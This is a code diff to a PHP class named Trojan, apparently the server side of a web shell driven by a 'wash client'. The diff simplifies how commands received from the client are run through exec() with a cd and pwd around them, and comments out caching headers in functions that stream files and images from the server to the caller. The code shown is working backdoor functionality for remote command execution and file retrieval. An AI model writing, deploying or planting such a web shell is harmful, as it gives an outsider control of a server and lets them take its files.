@@ -6,9 +6,6 @@ class Trojan{
     private $command         = '';
     private $cwd             = '';
     private $payloads        = array();
-    private $options         = array(
-        'redirect_stderr_to_stdout'  => true,
-    );
     // do I need this?
     private $output_raw      = array();
     private $response        = array(
@@ -83,12 +80,7 @@ class Trojan{
          * to inject some `cd` and `pwd` commands around the command sent from 
          * the wash client. */
 
-        # optionally (by default) redirect stderr to stdout
-        if($this->options['redirect_stderr_to_stdout']){
-            $command  = "cd {$this->cwd}; $command 2>&1; pwd";
-        } else {
-            $command  = "cd {$this->cwd}; $command; pwd";
-        }
+        $command  = "cd {$this->cwd}; $command 2>&1; pwd";
         exec($command, $this->output_raw);
 
         # buffer the results
@@ -160,10 +152,10 @@ class Trojan{
             header('Content-Type: application/octet-stream');
             header('Content-Disposition: attachment; filename='.basename($file));
             header('Content-Transfer-Encoding: binary');
-            header('Expires: 0');
-            header('Cache-Control: must-revalidate');
-            header('Pragma: public');
-            header('Content-Length: ' . filesize($file));
+            //header('Expires: 0');
+            //header('Cache-Control: must-revalidate');
+            //header('Pragma: public');
+            //header('Content-Length: ' . filesize($file));
             readfile($file);
         }
         
@@ -287,10 +279,10 @@ class Trojan{
             # extract some image information
             $image_data = getimagesize($file);
             header("Content-Type: {$image_data['mime']}");
-            header("Expires: 0");
-            header("Cache-Control: must-revalidate");
-            header("Pragma: public");
-            header("Content-Length: " . filesize($file));
+            //header("Expires: 0");
+            //header("Cache-Control: must-revalidate");
+            //header("Pragma: public");
+            //header("Content-Length: " . filesize($file));
             readfile($file);
         }
         
